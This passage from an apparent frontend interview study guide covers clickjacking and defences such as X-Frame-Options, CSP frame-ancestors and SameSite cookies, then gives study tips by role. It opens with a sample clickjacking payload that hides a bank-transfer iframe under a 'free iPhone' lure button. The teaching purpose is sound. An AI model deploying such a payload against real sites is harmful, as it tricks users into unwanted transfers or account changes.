    top: 100px;
    left: 100px;
    z-index: 1;
  }
</style>

<iframe src="https://bank.com/transfer"></iframe>
<button>Click for free iPhone!</button>

<!-- User clicks button, actually clicking hidden "Confirm Transfer" -->
```

**Real Attack Scenarios:**
- Like/share social media posts
- Delete account buttons
- Change privacy settings
- Authorize payments

**Prevention:**

**1. X-Frame-Options Header**
```http
# Prevent framing entirely
X-Frame-Options: DENY

# Allow same-origin framing
X-Frame-Options: SAMEORIGIN

# Allow specific origin
X-Frame-Options: ALLOW-FROM https://trusted-site.com
```

**2. CSP frame-ancestors Directive (Preferred)**
```http
# More flexible than X-Frame-Options
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
Content-Security-Policy: frame-ancestors https://trusted-site.com
```

**3. JavaScript Frame Busting (Weak)**
```javascript
// ❌ Can be bypassed
if (top !== self) {
  top.location = self.location;
}
```

**4. SameSite Cookies**
```http
# Helps prevent CSRF within clickjacking
Set-Cookie: session=abc; SameSite=Strict
```

**Best Practice:**
```http
# Use both for maximum compatibility
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

**Testing:**
```html
<!-- Try to embed your site -->
<iframe src="https://yoursite.com"></iframe>
<!-- Should be blocked if protection works -->
```

---

## Summary & Study Tips

### Priority Topics by Role

**Frontend Engineer:**
- Critical Rendering Path (Q16-30)
- Event Loop & JavaScript Engine (Q31-40)
- CORS & Basic Security (Q10-11, Q41-44)

**Senior Frontend Engineer:**
- Browser Architecture (Q1-9)
- Performance Optimization (Q16-30)
- Security Deep Dive (Q41-50)

**Staff/Principal Engineer:**
- All 50 questions
- Ability to explain tradeoffs
- System design implications

### Study Approach

1. **Understand, Don't Memorize**
   - Trace complete flows (URL → pixels)
   - Draw diagrams for complex topics
   - Explain to someone else

2. **Hands-On Practice**
   - Use Chrome DevTools Performance tab
   - Inspect network waterfalls
   - Create test cases for security issues

3. **Connect Concepts**
   - How do layers relate to performance?
   - Why does SOP require CORS?
   - How does V8 optimization affect coding patterns?

4. **Stay Current**
   - Web APIs evolve (INP replaced FID)
   - New browser features (HTTP/3, QUIC)
   - Security best practices change

### Key Resources

- **Chrome DevTools Documentation**
- **web.dev** (Google's performance guides)
- **MDN Web Docs** (comprehensive reference)
- **V8 Blog** (engine internals)
- **OWASP** (security best practices)

### Interview Preparation

**Common Question Patterns:**
- "What happens when..." (trace complete flows)
- "Why is X slow/fast?" (understand performance)
- "How would you optimize..." (practical problem-solving)
- "Explain the difference between..." (compare concepts)
- "What security risks..." (threat modeling)

**Red Flags to Avoid:**
- Saying "I don't know" without attempting
- Memorized answers without understanding
- Ignoring tradeoffs or edge cases
- Not asking clarifying questions

**Success Strategies:**
- Think aloud during answers
- Draw diagrams when helpful
- Admit uncertainty but reason through
- Connect to real-world experience

---
*Good luck with your interviews! Master the fundamentals, understand the tradeoffs, and always be ready to explain the "why" behind technical decisions.*
